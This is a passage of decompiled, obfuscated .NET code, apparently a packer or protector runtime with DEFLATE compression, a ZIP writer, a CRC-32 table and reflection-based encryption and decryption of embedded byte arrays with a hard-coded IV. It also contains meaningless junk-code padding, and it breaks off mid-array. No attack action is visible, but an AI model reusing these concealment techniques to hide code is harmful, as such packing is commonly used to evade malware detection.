      *(int*) ((IntPtr) voidPtr + 8) = -1;
      *(int*) ((IntPtr) voidPtr + 12) = 0;
      while (*(int*) ((IntPtr) voidPtr + 12) < obj1.\u0002)
      {
        int num = 1;
        *(int*) ((IntPtr) voidPtr + 16) = (int) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 12)];
        if (*(int*) ((IntPtr) voidPtr + 16) != 0)
        {
          *(int*) voidPtr = 6;
          *(int*) ((IntPtr) voidPtr + 4) = 3;
          if (*(int*) ((IntPtr) voidPtr + 8) != *(int*) ((IntPtr) voidPtr + 16))
          {
            \u0004.\u0001(_param0, *(int*) ((IntPtr) voidPtr + 16));
            num = 0;
          }
        }
        else
          goto label_17;
label_4:
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 16);
        *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
        while (*(int*) ((IntPtr) voidPtr + 12) < obj1.\u0002 && *(int*) ((IntPtr) voidPtr + 8) == (int) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 12)])
        {
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
          if (++num >= *(int*) voidPtr)
            break;
        }
        if (num < *(int*) ((IntPtr) voidPtr + 4))
        {
          while (num-- > 0)
            \u0004.\u0001(_param0, *(int*) ((IntPtr) voidPtr + 8));
          continue;
        }
        if (*(int*) ((IntPtr) voidPtr + 8) != 0)
        {
          \u0004.\u0001(_param0, 16);
          \u0004.\u0001(obj1.\u0001.\u0001, num - 3, 2);
          continue;
        }
        if (num <= 10)
        {
          \u0004.\u0001(_param0, 17);
          \u0004.\u0001(obj1.\u0001.\u0001, num - 3, 3);
          continue;
        }
        \u0004.\u0001(_param0, 18);
        \u0004.\u0001(obj1.\u0001.\u0001, num - 11, 7);
        continue;
label_17:
        *(int*) voidPtr = 138;
        *(int*) ((IntPtr) voidPtr + 4) = 3;
        goto label_4;
      }
    }

    static void \u0001(byte[] _param0, int _param1, int _param2, [In] \u0004.\u000E obj3)
    {
label_0:
      Array.Copy((Array) _param0, _param2, (Array) obj3.\u0001, obj3.\u0002, _param1);
      do
      {
        if (true)
          obj3.\u0002 += _param1;
        else
          goto label_0;
      }
      while (false);
    }

    static unsafe byte[] \u0001(int _param0, byte[] _param1, byte[] _param2, byte[] _param3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(64);
      try
      {
        \u0004.\u000F obj1 = new \u0004.\u000F();
        switch (_param0)
        {
          case 0:
            \u0004.\u0006 obj2 = new \u0004.\u0006();
            DateTime now = DateTime.Now;
            *(long*) voidPtr = (long) ((uint) ((now.Year - 1980 & (int) sbyte.MaxValue) << 25 | now.Month << 21 | now.Day << 16 | now.Hour << 11 | now.Minute << 5) | (uint) now.Second >> 1);
            uint[] numArray = new uint[256]
            {
              0U,
              1996959894U,
              3993919788U,
              2567524794U,
              124634137U,
              1886057615U,
              3915621685U,
              2657392035U,
              249268274U,
              2044508324U,
              3772115230U,
              2547177864U,
              162941995U,
              2125561021U,
              3887607047U,
              2428444049U,
              498536548U,
              1789927666U,
              4089016648U,
              2227061214U,
              450548861U,
              1843258603U,
              4107580753U,
              2211677639U,
              325883990U,
              1684777152U,
              4251122042U,
              2321926636U,
              335633487U,
              1661365465U,
              4195302755U,
              2366115317U,
              997073096U,
              1281953886U,
              3579855332U,
              2724688242U,
              1006888145U,
              1258607687U,
              3524101629U,
              2768942443U,
              901097722U,
              1119000684U,
              3686517206U,
              2898065728U,
              853044451U,
              1172266101U,
              3705015759U,
              2882616665U,
              651767980U,
              1373503546U,
              3369554304U,
              3218104598U,
              565507253U,
              1454621731U,
              3485111705U,
              3099436303U,
              671266974U,
              1594198024U,
              3322730930U,
              2970347812U,
              795835527U,
              1483230225U,
              3244367275U,
              3060149565U,
              1994146192U,
              31158534U,
              2563907772U,
              4023717930U,
              1907459465U,
              112637215U,
              2680153253U,
              3904427059U,
              2013776290U,
              251722036U,
              2517215374U,
              3775830040U,
              2137656763U,
              141376813U,
              2439277719U,
              3865271297U,
              1802195444U,
              476864866U,
              2238001368U,
              4066508878U,
              1812370925U,
              453092731U,
              2181625025U,
              4111451223U,
              1706088902U,
              314042704U,
              2344532202U,
              4240017532U,
              1658658271U,
              366619977U,
              2362670323U,
              4224994405U,
              1303535960U,
              984961486U,
              2747007092U,
              3569037538U,
              1256170817U,
              1037604311U,
              2765210733U,
              3554079995U,
              1131014506U,
              879679996U,
              2909243462U,
              3663771856U,
              1141124467U,
              855842277U,
              2852801631U,
              3708648649U,
              1342533948U,
              654459306U,
              3188396048U,
              3373015174U,
              1466479909U,
              544179635U,
              3110523913U,
              3462522015U,
              1591671054U,
              702138776U,
              2966460450U,
              3352799412U,
              1504918807U,
              783551873U,
              3082640443U,
              3233442989U,
              3988292384U,
              2596254646U,
              62317068U,
              1957810842U,
              3939845945U,
              2647816111U,
              81470997U,
              1943803523U,
              3814918930U,
              2489596804U,
              225274430U,
              2053790376U,
              3826175755U,
              2466906013U,
              167816743U,
              2097651377U,
              4027552580U,
              2265490386U,
              503444072U,
              1762050814U,
              4150417245U,
              2154129355U,
              426522225U,
              1852507879U,
              4275313526U,
              2312317920U,
              282753626U,
              1742555852U,
              4189708143U,
              2394877945U,
              397917763U,
              1622183637U,
              3604390888U,
              2714866558U,
              953729732U,
              1340076626U,
              3518719985U,
              2797360999U,
              1068828381U,
              1219638859U,
              3624741850U,
              2936675148U,
              906185462U,
              1090812512U,
              3747672003U,
              2825379669U,
              829329135U,
              1181335161U,
              3412177804U,
              3160834842U,
              628085408U,
              1382605366U,
              3423369109U,
              3138078467U,
              570562233U,
              1426400815U,
              3317316542U,
              2998733608U,
              733239954U,
              1555261956U,
              3268935591U,
              3050360625U,
              752459403U,
              1541320221U,
              2607071920U,
              3965973030U,
              1969922972U,
              40735498U,
              2617837225U,
              3943577151U,
              1913087877U,
              83908371U,
              2512341634U,
              3803740692U,
              2075208622U,
              213261112U,
              2463272603U,
              3855990285U,
              2094854071U,
              198958881U,
              2262029012U,
              4057260610U,
              1759359992U,
              534414190U,
              2176718541U,
              4139329115U,
              1873836001U,
              414664567U,
              2282248934U,
              4279200368U,
              1711684554U,
              285281116U,
              2405801727U,
              4167216745U,
              1634467795U,
              376229701U,
              2685067896U,
              3608007406U,
              1308918612U,
              956543938U,
              2808555105U,
              3495958263U,
              1231636301U,
              1047427035U,
              2932959818U,
              3654703836U,
              1088359270U,
              936918000U,
              2847714899U,
              3736837829U,
              1202900863U,
              817233897U,
              3183342108U,
              3401237130U,
              1404277552U,
              615818150U,
              3134207493U,
              3453421203U,
              1423857449U,
              601450431U,
              3009837614U,
              3294710456U,
              1567103746U,
              711928724U,
              3020668471U,
              3272380065U,
              1510334235U,
              755167117U
            };
            *(int*) ((IntPtr) voidPtr + 40) = -1;
            uint num1 = *(uint*) ((IntPtr) voidPtr + 40);
            int num2 = 0;
            int length = _param2.Length;
            while (--length >= 0)
              num1 = numArray[(IntPtr) (uint) (((int) num1 ^ (int) _param2[num2++]) & (int) byte.MaxValue)] ^ num1 >> 8;
            uint num3 = num1 ^ *(uint*) ((IntPtr) voidPtr + 40);
            \u0004.\u0001(67324752, obj1);
            \u0004.\u0001(obj1, 20);
            \u0004.\u0001(obj1, 0);
            \u0004.\u0001(obj1, 8);
            \u0004.\u0001((int) *(long*) voidPtr, obj1);
            \u0004.\u0001((int) num3, obj1);
            *(long*) ((IntPtr) voidPtr + 8) = obj1.Position;
            \u0004.\u0001(0, obj1);
            \u0004.\u0001(_param2.Length, obj1);
            byte[] bytes = Encoding.UTF8.GetBytes("{data}");
            \u0004.\u0001(obj1, bytes.Length);
            \u0004.\u0001(obj1, 0);
            obj1.Write(bytes, 0, bytes.Length);
            \u0004.\u0001(obj2, _param2);
            while (!obj2.IsNeedingInput)
            {
              byte[] buffer = new byte[512];
              *(int*) ((IntPtr) voidPtr + 44) = \u0004.\u0001(obj2, buffer);
              if (*(int*) ((IntPtr) voidPtr + 44) > 0)
                obj1.Write(buffer, 0, *(int*) ((IntPtr) voidPtr + 44));
              else
                break;
            }
            obj2.\u0007 |= 12;
            while (!obj2.IsFinished)
            {
              byte[] buffer = new byte[512];
              *(int*) ((IntPtr) voidPtr + 48) = \u0004.\u0001(obj2, buffer);
              if (*(int*) ((IntPtr) voidPtr + 48) > 0)
                obj1.Write(buffer, 0, *(int*) ((IntPtr) voidPtr + 48));
              else
                break;
            }
            *(long*) ((IntPtr) voidPtr + 16) = obj2.\u0001;
            \u0004.\u0001(33639248, obj1);
            \u0004.\u0001(obj1, 20);
            \u0004.\u0001(obj1, 20);
            \u0004.\u0001(obj1, 0);
            \u0004.\u0001(obj1, 8);
            \u0004.\u0001((int) *(long*) voidPtr, obj1);
            \u0004.\u0001((int) num3, obj1);
            \u0004.\u0001((int) *(long*) ((IntPtr) voidPtr + 16), obj1);
            \u0004.\u0001(_param2.Length, obj1);
            \u0004.\u0001(obj1, bytes.Length);
            \u0004.\u0001(obj1, 0);
            \u0004.\u0001(obj1, 0);
            \u0004.\u0001(obj1, 0);
            \u0004.\u0001(obj1, 0);
            \u0004.\u0001(0, obj1);
            \u0004.\u0001(0, obj1);
            obj1.Write(bytes, 0, bytes.Length);
            \u0004.\u0001(101010256, obj1);
            \u0004.\u0001(obj1, 0);
            \u0004.\u0001(obj1, 0);
            \u0004.\u0001(obj1, 1);
            \u0004.\u0001(obj1, 1);
            \u0004.\u0001(46 + bytes.Length, obj1);
            \u0004.\u0001((int) ((long) (30 + bytes.Length) + *(long*) ((IntPtr) voidPtr + 16)), obj1);
            \u0004.\u0001(obj1, 0);
            obj1.Seek(*(long*) ((IntPtr) voidPtr + 8), SeekOrigin.Begin);
            \u0004.\u0001((int) *(long*) ((IntPtr) voidPtr + 16), obj1);
            break;
          case 1:
            \u0004.\u0001(25000571, obj1);
            \u0004.\u0001(_param2.Length, obj1);
            *(int*) ((IntPtr) voidPtr + 52) = 0;
            while (*(int*) ((IntPtr) voidPtr + 52) < _param2.Length)
            {
              byte[] dst = new byte[Math.Min(2097151, _param2.Length - *(int*) ((IntPtr) voidPtr + 52))];
              Buffer.BlockCopy((Array) _param2, *(int*) ((IntPtr) voidPtr + 52), (Array) dst, 0, dst.Length);
              *(long*) ((IntPtr) voidPtr + 24) = obj1.Position;
              \u0004.\u0001(0, obj1);
              \u0004.\u0001(dst.Length, obj1);
              \u0004.\u0006 obj3 = new \u0004.\u0006();
              \u0004.\u0001(obj3, dst);
              while (!obj3.IsNeedingInput)
              {
                byte[] buffer = new byte[512];
                *(int*) ((IntPtr) voidPtr + 56) = \u0004.\u0001(obj3, buffer);
                if (*(int*) ((IntPtr) voidPtr + 56) > 0)
                  obj1.Write(buffer, 0, *(int*) ((IntPtr) voidPtr + 56));
                else
                  break;
              }
              obj3.\u0007 |= 12;
              while (!obj3.IsFinished)
              {
                byte[] buffer = new byte[512];
                *(int*) ((IntPtr) voidPtr + 60) = \u0004.\u0001(obj3, buffer);
                if (*(int*) ((IntPtr) voidPtr + 60) > 0)
                  obj1.Write(buffer, 0, *(int*) ((IntPtr) voidPtr + 60));
                else
                  break;
              }
              *(long*) ((IntPtr) voidPtr + 32) = obj1.Position;
              obj1.Position = *(long*) ((IntPtr) voidPtr + 24);
              \u0004.\u0001((int) obj3.\u0001, obj1);
              obj1.Position = *(long*) ((IntPtr) voidPtr + 32);
              *(int*) ((IntPtr) voidPtr + 52) = *(int*) ((IntPtr) voidPtr + 52) + dst.Length;
            }
            break;
          case 2:
            \u0004.\u0001(41777787, obj1);
            byte[] inputBuffer1 = \u0004.\u0001(1, (byte[]) null, _param2, (byte[]) null);
            using (\u0001.\u0006 obj4 = new \u0001.\u0006())
            {
              using (ICryptoTransform cryptoTransform = \u0004.\u0001(_param1, obj4, _param3, false))
              {
                byte[] buffer = cryptoTransform.TransformFinalBlock(inputBuffer1, 0, inputBuffer1.Length);
                obj1.Write(buffer, 0, buffer.Length);
                break;
              }
            }
          case 3:
            \u0004.\u0001(58555003, obj1);
            byte[] inputBuffer2 = \u0004.\u0001(1, (byte[]) null, _param2, (byte[]) null);
            using (\u0005.\u0003 obj5 = new \u0005.\u0003())
            {
              using (ICryptoTransform cryptoTransform = \u0004.\u0001(_param1, obj5, _param3, false))
              {
                byte[] buffer = cryptoTransform.TransformFinalBlock(inputBuffer2, 0, inputBuffer2.Length);
                obj1.Write(buffer, 0, buffer.Length);
                break;
              }
            }
        }
        obj1.Flush();
        obj1.Close();
        return obj1.ToArray();
      }
      catch (Exception ex)
      {
        \u0004.\u0001 = "ERR 2003: " + ex.Message;
        throw;
      }
    }

    static ICryptoTransform \u0001(
      byte[] _param0,
      \u0001.\u0006 _param1,
      byte[] _param2,
      [In] bool obj3)
    {
      _param1.\u0001.GetProperty("Key").GetSetMethod().Invoke(_param1.\u0001, new object[1]
      {
        (object) _param0
      });
      _param1.\u0001.GetProperty("IV").GetSetMethod().Invoke(_param1.\u0001, new object[1]
      {
        (object) _param2
      });
      return (ICryptoTransform) _param1.\u0001.GetMethod(obj3 ? "CreateDecryptor" : "CreateEncryptor", new System.Type[0]).Invoke(_param1.\u0001, new object[0]);
    }

    static void \u0001(
      int _param0,
      byte[] _param1,
      \u0004.\u0007 _param2,
      int _param3,
      [In] bool obj4)
    {
      \u0004.\u0001(_param2.\u0001, obj4 ? 1 : 0, 3);
      \u0004.\u0001(_param2.\u0001);
      \u0004.\u0001(_param2.\u0001, _param3);
      \u0004.\u0001(_param2.\u0001, ~_param3);
      \u0004.\u0001(_param1, _param3, _param0, _param2.\u0001);
      \u0004.\u0001(_param2);
    }

    static bool \u0001(bool _param0, bool _param1, [In] \u0004.\u0008 obj2)
    {
      bool flag1;
      int num1;
      do
      {
        \u0004.\u0001(obj2);
        int num2;
        while (!_param1)
        {
          if (true)
          {
            num2 = 0;
            goto label_6;
          }
        }
        goto label_15;
label_6:
        if (true)
        {
          bool flag2 = num2 != 0;
          int num3 = _param0 ? 1 : 0;
          if (false)
          {
            num1 = num3;
            goto label_12;
          }
          else
          {
            \u0004.\u0008 obj = obj2;
            int num4 = flag2 ? 1 : 0;
            flag1 = \u0004.\u0001(num3 != 0, obj, num4 != 0);
            num2 = obj2.\u0001.\u0002;
          }
        }
        else
          goto label_9;
label_7:
        int num5 = 0;
label_8:
        num2 = num2 == num5 ? 1 : 0;
label_9:
        if (true)
        {
          if (num2 != 0)
            num1 = flag1 ? 1 : 0;
          else
            break;
        }
        else
          goto label_7;
label_12:
        continue;
label_15:
        int num6 = obj2.\u0017;
        int num7 = obj2.\u0018;
        if (true)
        {
          num2 = num6 == num7 ? 1 : 0;
          goto label_6;
        }
        else
        {
          num5 = num7;
          num2 = num6;
          goto label_8;
        }
      }
      while (num1 != 0);
      return flag1;
    }

    static unsafe int \u0001(\u0004.\u0002 _param0, byte[] _param1, int _param2, [In] int obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      *(int*) voidPtr = 0;
      int num1;
      int num2;
      int num3;
      while (true)
      {
        int num4 = _param0.\u0003;
        int num5 = 0;
        while (true)
        {
          if (num5 == 0)
          {
            if (num4 <= num5 || obj3 <= 0)
            {
              if (obj3 != 0)
              {
                *(int*) ((IntPtr) voidPtr + 4) = _param0.\u0002 - _param0.\u0001;
                int num6 = obj3;
                num5 = *(int*) ((IntPtr) voidPtr + 4);
                num4 = num6;
              }
              else
                break;
            }
            else
              goto label_21;
          }
          if (num4 > num5)
            obj3 = *(int*) ((IntPtr) voidPtr + 4);
          do
          {
            Array.Copy((Array) _param0.\u0001, _param0.\u0001, (Array) _param1, _param2, obj3);
          }
          while (false);
          _param0.\u0001 += obj3;
          num1 = _param0.\u0001;
          if (true)
          {
            int num7 = _param0.\u0002;
            num2 = num1 - num7;
            num3 = 1;
            if (num3 == 0)
            {
              num5 = num3;
              num4 = num2;
            }
            else
              goto label_15;
          }
          else
            goto label_20;
        }
        if (false)
          goto label_22;
        else
          break;
label_21:
        _param1[_param2++] = (byte) _param0.\u0001;
        if (true)
        {
          _param0.\u0001 >>= 8;
          _param0.\u0003 -= 8;
          --obj3;
        }
        else
          goto label_16;
label_22:
        *(int*) voidPtr = *(int*) voidPtr + 1;
      }
      return *(int*) voidPtr;
label_15:
      if ((num2 & num3) == 0)
        goto label_19;
label_16:
      if (true)
        _param0.\u0001 = (uint) _param0.\u0001[_param0.\u0001++] & (uint) byte.MaxValue;
      _param0.\u0003 = 8;
label_19:
      num1 = *(int*) voidPtr;
label_20:
      int num8 = obj3;
      return num1 + num8;
    }

    static unsafe void \u0001([In] \u0004.\u0007.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(16);
      int length = obj0.\u0001.Length;
      int[] numArray = new int[obj0.\u0003];
      do
      {
        *(int*) voidPtr = 0;
        obj0.\u0002 = new short[obj0.\u0001.Length];
        *(int*) ((IntPtr) voidPtr + 4) = 0;
      }
      while (false);
      while (*(int*) ((IntPtr) voidPtr + 4) < obj0.\u0003)
      {
        numArray[*(int*) ((IntPtr) voidPtr + 4)] = *(int*) voidPtr;
        *(int*) voidPtr = *(int*) voidPtr + (obj0.\u0001[*(int*) ((IntPtr) voidPtr + 4)] << 15 - *(int*) ((IntPtr) voidPtr + 4));
        *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 1;
      }
      *(int*) ((IntPtr) voidPtr + 8) = 0;
      while (*(int*) ((IntPtr) voidPtr + 8) < obj0.\u0002)
      {
        *(int*) ((IntPtr) voidPtr + 12) = (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 8)];
        if (*(int*) ((IntPtr) voidPtr + 12) > 0)
        {
          obj0.\u0002[*(int*) ((IntPtr) voidPtr + 8)] = \u0004.\u0001(numArray[*(int*) ((IntPtr) voidPtr + 12) - 1]);
          numArray[*(int*) ((IntPtr) voidPtr + 12) - 1] += 1 << 16 - *(int*) ((IntPtr) voidPtr + 12);
        }
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
      }
    }

    static unsafe object \u0001([In] \u0007.\u0001 obj0)
    {
label_0:
      // ISSUE: untyped stack allocation
      void* voidPtr1 = (void*) __untypedstackalloc(171);
      *(double*) ((IntPtr) voidPtr1 + 16) = 96195316.0;
      void* voidPtr2;
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        while (true)
        {
          *(sbyte*) ((IntPtr) voidPtr2 + 169) = (sbyte) 0;
          if (*(sbyte*) ((IntPtr) voidPtr2 + 169) != (sbyte) 0)
          {
            *(sbyte*) ((IntPtr) voidPtr2 + 164) = (sbyte) 0;
            *(long*) ((IntPtr) voidPtr2 + 48) = 95L;
          }
          else
            break;
        }
        string str1 = \u0004.\u000F(6071);
        *(int*) ((IntPtr) voidPtr2 + 116) = 3640187;
        while (true)
        {
          *(sbyte*) ((IntPtr) voidPtr2 + 169) = (sbyte) 1;
          if (*(sbyte*) ((IntPtr) voidPtr2 + 169) != (sbyte) 0)
            *(long*) ((IntPtr) voidPtr2 + 56) = 53504527L;
          else
            break;
        }
        *(double*) ((IntPtr) voidPtr2 + 16) = 6.0;
        do
        {
          *(sbyte*) ((IntPtr) voidPtr2 + 169) = (sbyte) 0;
        }
        while (*(sbyte*) ((IntPtr) voidPtr2 + 169) != (sbyte) 0);
        string str2 = \u0004.\u000F(6257);
        *(int*) ((IntPtr) voidPtr2 + 112) = 1;
        string str3 = \u0004.\u000F(6318);
        *(double*) ((IntPtr) voidPtr2 + 32) = 26379.0;
        *(double*) ((IntPtr) voidPtr2 + 40) = 1.0;
        int num = (int) MessageBox.Show(\u0004.\u000F(6411));
        ProjectData.ClearProjectError();
      }
      string str4 = \u0004.\u000F(6749);
      *(long*) ((IntPtr) voidPtr1 + 24) = 8246021L;
      if (true)
        goto label_52;
label_14:
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        while (true)
        {
          *(sbyte*) ((IntPtr) voidPtr2 + 170) = (sbyte) 1;
          if (*(sbyte*) ((IntPtr) voidPtr2 + 170) != (sbyte) 0)
          {
            *(int*) ((IntPtr) voidPtr2 + 120) = 999;
            int num1;
            int num2;
            do
            {
              *(sbyte*) ((IntPtr) voidPtr2 + 165) = (sbyte) 1;
              string str5 = \u0004.\u000F(6851);
              string str6 = \u0004.\u000F(6860);
              *(sbyte*) ((IntPtr) voidPtr2 + 169) = (sbyte) 0;
              if (*(sbyte*) ((IntPtr) voidPtr2 + 169) != (sbyte) 0)
              {
                *(sbyte*) ((IntPtr) voidPtr2 + 170) = (sbyte) 1;
                if (*(sbyte*) ((IntPtr) voidPtr2 + 170) != (sbyte) 0)
                {
                  *(long*) ((IntPtr) voidPtr2 + 88) = 79888439L;
                  *(sbyte*) ((IntPtr) voidPtr2 + 170) = (sbyte) 1;
                  if (*(sbyte*) ((IntPtr) voidPtr2 + 170) != (sbyte) 0)
                    ;
                }
                else
                  goto label_24;
              }
              else
                goto label_25;
label_23:
              *(double*) ((IntPtr) voidPtr2 + 80) = 0.0;
              *(sbyte*) ((IntPtr) voidPtr2 + 167) = (sbyte) 1;
              *(int*) ((IntPtr) voidPtr2 + 132) = 94857;
              *(int*) ((IntPtr) voidPtr2 + 128) = 1;
              *(sbyte*) ((IntPtr) voidPtr2 + 166) = (sbyte) 0;
              *(int*) ((IntPtr) voidPtr2 + 124) = 40;
              *(int*) ((IntPtr) voidPtr2 + 136) = 2782800;
label_24:
              *(double*) ((IntPtr) voidPtr2 + 72) = 0.0;
label_25:
              str4 = \u0004.\u000F(7170);
              if (true)
              {
                *(long*) ((IntPtr) voidPtr2 + 8) = 162822L;
                *(int*) ((IntPtr) voidPtr2 + 120) = checked (*(int*) unchecked ((IntPtr) voidPtr2 + 120) + 1);
                num1 = *(int*) ((IntPtr) voidPtr2 + 120);
                *(int*) ((IntPtr) voidPtr2 + 160) = 67618;
                num2 = *(int*) ((IntPtr) voidPtr2 + 160);
              }
              else
                goto label_23;
            }
            while (num1 <= num2);
            *(double*) ((IntPtr) voidPtr2 + 64) = 6466.0;
            while (true)
            {
              *(sbyte*) ((IntPtr) voidPtr2 + 170) = (sbyte) 1;
              if (*(sbyte*) ((IntPtr) voidPtr2 + 170) != (sbyte) 0)
              {
                *(double*) ((IntPtr) voidPtr2 + 16) = 1.0;
                *(double*) ((IntPtr) voidPtr2 + 96) = 32620621.0;
                while (true)
                {
                  *(sbyte*) ((IntPtr) voidPtr2 + 170) = (sbyte) 0;
                  if (*(sbyte*) ((IntPtr) voidPtr2 + 170) != (sbyte) 0)
                  {
                    int num3 = (int) MessageBox.Show(\u0004.\u000F(7195));
                    *(double*) ((IntPtr) voidPtr2 + 104) = 2.0;
                  }
                  else
                    break;
                }
                *(long*) ((IntPtr) voidPtr2 + 8) = 583359L;
                *(sbyte*) ((IntPtr) voidPtr2 + 168) = (sbyte) 1;
                *(int*) ((IntPtr) voidPtr2 + 140) = 0;
                *(sbyte*) ((IntPtr) voidPtr2 + 170) = (sbyte) 0;
                if (*(sbyte*) ((IntPtr) voidPtr2 + 170) != (sbyte) 0)
                  *(int*) ((IntPtr) voidPtr2 + 144) = 26137;
                else
                  *(int*) ((IntPtr) voidPtr2 + 148) = 78521222;
                str4 = \u0004.\u000F(7256);
              }
              else
                break;
            }
            int num4 = (int) Interaction.MsgBox((object) \u0004.\u000F(7430));
          }
          else
            break;
        }
        *(sbyte*) ((IntPtr) voidPtr2 + 170) = (sbyte) 0;
        if (*(sbyte*) ((IntPtr) voidPtr2 + 170) != (sbyte) 0)
        {
          int num = (int) Interaction.MsgBox((object) \u0004.\u000F(7688));
        }
        else
          *(int*) ((IntPtr) voidPtr2 + 152) = 9194;
        ProjectData.ClearProjectError();
      }
      if (false)
        goto label_0;
label_43:
      *(sbyte*) ((IntPtr) voidPtr1 + 170) = (sbyte) 1;
label_44:
      int num5 = (int) *(sbyte*) ((IntPtr) voidPtr1 + 170);
      if (true)
      {
        if (num5 != 0)
          goto label_14;
      }
      else
        goto label_48;
label_46:
      *(sbyte*) ((IntPtr) voidPtr1 + 170) = (sbyte) 0;
      if (*(sbyte*) ((IntPtr) voidPtr1 + 170) != (sbyte) 0)
      {
        str4 = \u0004.\u000F(6770);
        if (true)
          goto label_43;
        else
          goto label_44;
      }
      else
      {
        *(sbyte*) ((IntPtr) voidPtr1 + 170) = (sbyte) 0;
        num5 = (int) *(sbyte*) ((IntPtr) voidPtr1 + 170);
      }
label_48:
      if (num5 != 0)
      {
        int num6 = (int) Interaction.MsgBox((object) \u0004.\u000F(7717));
      }
      else
        *(int*) ((IntPtr) voidPtr1 + 156) = 97973824;
      return (object) 3735;
label_52:
      *(long*) ((IntPtr) voidPtr1 + 8) = 5891630L;
      *(long*) voidPtr1 = 10L;
      goto label_46;
    }

    static void \u0001(\u0004.\u0003 _param0, [In] int obj1)
    {
label_0:
      do
      {
        \u0004.\u0003 obj2 = _param0;
        int num1;
        int num2 = num1 = obj2.\u0004;
        obj2.\u0004 = num1 + 1;
        do
        {
          if (true)
          {
            if (num2 != 32768)
              goto label_3;
label_2:
            goto label_0;
label_3:
            if (true)
            {
              byte[] numArray = _param0.\u0001;
              \u0004.\u0003 obj3 = _param0;
              int num3;
              num2 = num3 = obj3.\u0003;
              obj3.\u0003 = num3 + 1;
              int index = num2;
              int num4 = (int) (byte) obj1;
              numArray[index] = (byte) num4;
              if (false)
                goto label_2;
            }
            else
              goto label_0;
          }
          else
            goto label_0;
        }
        while (false);
        goto label_5;
      }
      while (false);
      goto label_7;
label_5:
      _param0.\u0003 &= (int) short.MaxValue;
      return;
label_7:
      throw new InvalidOperationException();
    }

    static void \u0001(\u0004.\u000F _param0, [In] int obj1)
    {
      _param0.WriteByte((byte) (obj1 & (int) byte.MaxValue));
      _param0.WriteByte((byte) (obj1 >> 8 & (int) byte.MaxValue));
    }

    static byte[] \u0001(byte[] _param0, byte[] _param1, byte[] _param2) => \u0004.\u0001(3, _param1, _param2, _param0);

    static void \u0001([In] \u0004.\u0002 obj0)
    {
      do
      {
        if (true)
          goto label_3;
label_2:
        continue;
label_3:
        obj0.\u0001 = (uint) (obj0.\u0001 = obj0.\u0002 = obj0.\u0003 = 0);
        goto label_2;
      }
      while (false);
    }

    static void \u0001(\u0004.\u0003 _param0, int _param1, [In] int obj2)
    {
      if ((_param0.\u0004 += _param1) > 32768)
        throw new InvalidOperationException();
      int sourceIndex = _param0.\u0003 - obj2 & (int) short.MaxValue;
      int num = 32768 - _param1;
      if (sourceIndex <= num && _param0.\u0003 < num)
      {
        if (_param1 <= obj2)
        {
          Array.Copy((Array) _param0.\u0001, sourceIndex, (Array) _param0.\u0001, _param0.\u0003, _param1);
          _param0.\u0003 += _param1;
        }
        else
        {
          while (_param1-- > 0)
            _param0.\u0001[_param0.\u0003++] = _param0.\u0001[sourceIndex++];
        }
      }
      else
        \u0004.\u0001(_param0, sourceIndex, _param1, obj2);
    }

    static short \u0001(int _param0) => (short) ((int) \u0004.\u0007.\u0001[_param0 & 15] << 12 | (int) \u0004.\u0007.\u0001[_param0 >> 4 & 15] << 8 | (int) \u0004.\u0007.\u0001[_param0 >> 8 & 15] << 4 | (int) \u0004.\u0007.\u0001[_param0 >> 12]);

    static void \u0001(\u0004.\u0007.\u0001 _param0, [In] int obj1) => \u0004.\u0001(_param0.\u0001.\u0001, (int) _param0.\u0002[obj1] & (int) ushort.MaxValue, (int) _param0.\u0001[obj1]);

    static unsafe byte[] \u0001(byte[] _param0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(46);
      Assembly callingAssembly = Assembly.GetCallingAssembly();
      if (true)
        goto label_47;
label_7:
      \u0004.\u000F obj1;
      *(int*) ((IntPtr) voidPtr + 12) = \u0004.\u0001(obj1);
      byte[] numArray1;
      if (true)
      {
        *(int*) ((IntPtr) voidPtr + 16) = \u0004.\u0001(obj1);
        *(int*) ((IntPtr) voidPtr + 20) = \u0004.\u0001(obj1);
        if (*(int*) ((IntPtr) voidPtr + 16) > 0)
        {
          byte[] buffer = new byte[*(int*) ((IntPtr) voidPtr + 16)];
          obj1.Read(buffer, 0, *(int*) ((IntPtr) voidPtr + 16));
        }
        if (*(int*) ((IntPtr) voidPtr + 20) > 0)
        {
          byte[] buffer = new byte[*(int*) ((IntPtr) voidPtr + 20)];
          obj1.Read(buffer, 0, *(int*) ((IntPtr) voidPtr + 20));
        }
        long length = obj1.Length;
        if (true)
        {
          long position = obj1.Position;
          length -= position;
        }
        byte[] numArray2 = new byte[length];
        obj1.Read(numArray2, 0, numArray2.Length);
        \u0004.\u0001 obj2 = new \u0004.\u0001(numArray2);
        numArray1 = new byte[*(int*) ((IntPtr) voidPtr + 12)];
        \u0004.\u0001(numArray1.Length, obj2, 0, numArray1);
        goto label_46;
      }
label_23:
      byte[] numArray3 = new byte[8]
      {
        (byte) 154,
        (byte) 120,
        (byte) 118,
        (byte) 67,
        (byte) 130,
        (byte) 245,
        byte.MaxValue,
        (byte) 238
      };
      \u0001.\u0006 obj3 = new \u0001.\u0006();
      byte[] numArray4;
      try
      {
        if (true)
        {
          using (ICryptoTransform cryptoTransform = \u0004.\u0001(numArray4, obj3, numArray3, true))
            numArray1 = \u0004.\u0001(cryptoTransform.TransformFinalBlock(_param0, 4, _param0.Length - 4));
        }
      }
      finally
      {
        while (obj3 != null)
        {
          if (true)
          {
            ((IDisposable) obj3).Dispose();
            break;
          }
        }
      }
label_34:
      if (*(int*) ((IntPtr) voidPtr + 24) == 3)
      {
        byte[] numArray5 = new byte[16]
        {
          (byte) 1,
